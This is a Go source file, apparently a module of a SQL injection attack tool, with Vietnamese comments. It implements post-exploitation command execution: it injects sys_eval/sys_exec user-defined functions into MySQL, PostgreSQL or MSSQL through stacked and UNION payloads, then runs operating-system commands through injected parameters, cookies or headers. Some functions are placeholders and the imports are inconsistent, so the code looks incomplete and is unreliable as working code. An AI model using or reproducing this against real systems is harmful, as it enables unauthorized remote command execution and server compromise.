package cmd

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"go.uber.org/zap"
)

type ShellResult struct {
	Command   string `json:"command"`
	Output    string `json:"output"`
	Error     string `json:"error"`
	ExitCode  int    `json:"exit_code"`
	ShellType string `json:"shell_type"`
	Interactive bool `json:"interactive"`
}

type ShellOptions struct {
	Command     string
	Interactive bool
	Type        string // interactive|oneshot|reverse
}

type Shell struct{}

func NewShell() *Shell {
	return &Shell{}
}

func (s *Shell) Execute(ctx context.Context, session *Session, opts ShellOptions) (*ShellResult, error) {
	logger := Logger()
	logger.Info("Bắt đầu shell thông qua tiêm UDF",
		zap.String("type", opts.Type),
		zap.Bool("interactive", opts.Interactive))
	
	if session.Injection == nil {
		return nil, fmt.Errorf("không có điểm tiêm")
	}
	
	if session.DBMS == nil {
		return nil, fmt.Errorf("chưa nhận diện được DBMS")
	}
	
	// Bước 1: Kiểm tra UDF đã tồn tại chưa
	if !s.checkUDFExists(ctx, session) {
		// Bước 2: Biên dịch và tiêm UDF
		if err := s.injectUDF(ctx, session); err != nil {
			return nil, fmt.Errorf("tiêm UDF thất bại: %v", err)
		}
	}
	
	// Bước 3: Thực thi lệnh
	if opts.Command != "" {
		return s.executeCommand(ctx, session, opts.Command)
	}
	
	// Bước 4: Shell tương tác
	if opts.Interactive {
		return s.interactiveShell(ctx, session)
	}
	
	return &ShellResult{
		Command:   "shell_ready",
		Output:    "Đã tiêm UDF. Dùng --cmd để chạy lệnh hoặc --interactive để mở shell.",
		ShellType: opts.Type,
	}, nil
}

func (s *Shell) checkUDFExists(ctx context.Context, session *Session) bool {
	query := "SELECT 1 FROM mysql.func WHERE name IN ('sys_eval', 'sys_exec')"
	if session.DBMS.Type == "postgres" {
		query = "SELECT 1 FROM pg_proc WHERE proname IN ('sys_eval', 'sys_exec')"
	} else if session.DBMS.Type == "mssql" {
		query = "SELECT 1 FROM sys.objects WHERE name IN ('sys_eval', 'sys_exec') AND type = 'X'"
	}
	
	payload := fmt.Sprintf("' UNION SELECT %s-- ", query)
	resp, _ := s.sendPayload(ctx, session, payload)
	return strings.Contains(resp.String(), "1")
}

func (s *Shell) injectUDF(ctx context.Context, session *Session) error {
	logger := Logger()
	logger.Info("Đang tiêm UDF", zap.String("dbms", session.DBMS.Type))
	
	udfPath := viper.GetString("post_exploit.udf_path")
	var udfFile string
	
	switch session.DBMS.Type {
	case "mysql":
		udfFile = filepath.Join(udfPath, "lib_mysqludf_sys.so")
	case "postgres":
		udfFile = filepath.Join(udfPath, "lib_pgudf_sys.so")
	case "mssql":
		udfFile = filepath.Join(udfPath, "mssql_udf.dll")
	default:
		return fmt.Errorf("UDF không được hỗ trợ cho %s", session.DBMS.Type)
	}
	
	// Đọc binary UDF
	udfData, err := os.ReadFile(udfFile)
	if err != nil {
		// Thử biên dịch từ source
		if err := s.compileUDF(session.DBMS.Type); err != nil {
			return fmt.Errorf("không tìm thấy binary UDF và biên dịch thất bại: %v", err)
		}
		udfData, _ = os.ReadFile(udfFile)
	}
	
	// Mã hóa thành hex
	udfHex := fmt.Sprintf("0x%x", udfData)
	
	// Tạo UDF bằng truy vấn xếp chồng hoặc INTO DUMPFILE
	var payload string
	switch session.DBMS.Type {
	case "mysql":
		// Ghi UDF vào thư mục plugin
		pluginDir := s.getMySQLPluginDir(ctx, session)
		dumpQuery := fmt.Sprintf("SELECT %s INTO DUMPFILE '%s/lib_mysqludf_sys.so'", udfHex, pluginDir)
		payload = fmt.Sprintf("%s; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so'; CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'", dumpQuery)
	case "postgres":
		// PostgreSQL: CREATE FUNCTION với LOAD
		payload = fmt.Sprintf("CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '%s', 'sys_eval' LANGUAGE C STRICT; CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int AS '%s', 'sys_exec' LANGUAGE C STRICT", udfFile, udfFile)
	case "mssql":
		// MSSQL: sp_addextendedproc hoặc CREATE ASSEMBLY
		payload = fmt.Sprintf("CREATE ASSEMBLY sql_udf FROM %s WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE sys_eval @cmd NVARCHAR(MAX) AS EXTERNAL NAME sql_udf.[StoredProcedures].sys_eval; CREATE PROCEDURE sys_exec @cmd NVARCHAR(MAX) AS EXTERNAL NAME sql_udf.[StoredProcedures].sys_exec", udfHex)
	}
	
	resp, err := s.sendStackedPayload(ctx, session, payload)
	if err != nil {
		return err
	}
	
	logger.Info("Đã tiêm UDF", zap.String("response", resp.String()[:200]))
	return nil
}

func (s *Shell) compileUDF(dbms string) error {
	// Biên dịch từ source trong signatures/udf_source/
	sourceDir := viper.GetString("signatures.udf_source_dir")
	binDir := viper.GetString("signatures.udf_bin_dir")
	
	// Bước này sẽ gọi gcc/clang tương ứng với DBMS
	// Việc triển khai phụ thuộc môi trường build
	return fmt.Errorf("chưa triển khai biên dịch UDF")
}

func (s *Shell) getMySQLPluginDir(ctx context.Context, session *Session) string {
	query := "SELECT @@plugin_dir"
	payload := fmt.Sprintf("' UNION SELECT %s-- ", query)
	resp, _ := s.sendPayload(ctx, session, payload)
	// Phân tích plugin_dir từ phản hồi
	return "/usr/lib/mysql/plugin/"
}

func (s *Shell) executeCommand(ctx context.Context, session *Session, command string) (*ShellResult, error) {
	// Escape lệnh để đưa vào SQL
	escaped := strings.ReplaceAll(command, "'", "''")
	
	var query string
	switch session.DBMS.Type {
	case "mysql":
		query = fmt.Sprintf("SELECT sys_eval('%s')", escaped)
	case "postgres":
		query = fmt.Sprintf("SELECT sys_eval('%s')", escaped)
	case "mssql":
		query = fmt.Sprintf("EXEC sys_exec '%s'", escaped)
	}
	
	payload := fmt.Sprintf("' UNION SELECT %s-- ", query)
	resp, err := s.sendPayload(ctx, session, payload)
	if err != nil {
		return nil, err
	}
	
	output := s.parseCommandOutput(resp.String(), session.DBMS.Type)
	
	return &ShellResult{
		Command:  command,
		Output:   output,
		ExitCode: 0,
	}, nil
}

func (s *Shell) interactiveShell(ctx context.Context, session *Session) (*ShellResult, error) {
	fmt.Println("SQL Shell tương tác (nhập 'exit' để thoát)")
	fmt.Println("Đã kết nối tới:", session.DBMS.Type)
	
	// Bước này sẽ chạy vòng lặp REPL
	// Hiện tại trả về placeholder
	return &ShellResult{
		Command:      "interactive",
		Output:       "Đã khởi động shell tương tác",
		ShellType:    "interactive",
		Interactive:  true,
	}, nil
}

func (s *Shell) parseCommandOutput(body, dbms string) string {
	// Trích xuất output của lệnh từ phản hồi SQL
	// Việc này phụ thuộc định dạng phản hồi
	return body
}

func (s *Shell) sendPayload(ctx context.Context, session *Session, payload string) (*resty.Response, error) {
	client := session.GetClient()
	param := session.Injection.Parameter
	
	switch session.Injection.Type {
	case "GET":
		u, _ := url.Parse(session.URL)
		q := u.Query()
		q.Set(param, payload)
		u.RawQuery = q.Encode()
		return client.R().Get(u.String())
	case "POST":
		data := session.Data
		if strings.Contains(data, "=") {
			pairs := strings.Split(data, "&")
			for i, p := range pairs {
				kv := strings.SplitN(p, "=", 2)
				if len(kv) == 2 && kv[0] == param {
					pairs[i] = param + "=" + payload
				}
			}
			data = strings.Join(pairs, "&")
		} else {
			data = param + "=" + payload
		}
		return client.R().SetBody(data).Post(session.URL)
	case "COOKIE":
		return client.R().SetCookie(&http.Cookie{Name: param, Value: payload}).Get(session.URL)
	case "HEADER":
		return client.R().SetHeader(param, payload).Get(session.URL)
	}
	return nil, fmt.Errorf("kiểu không được hỗ trợ")
}

func (s *Shell) sendStackedPayload(ctx context.Context, session *Session, payload string) (*resty.Response, error) {
	// Gửi payload truy vấn xếp chồng
	return s.sendPayload(ctx, session, payload)
}
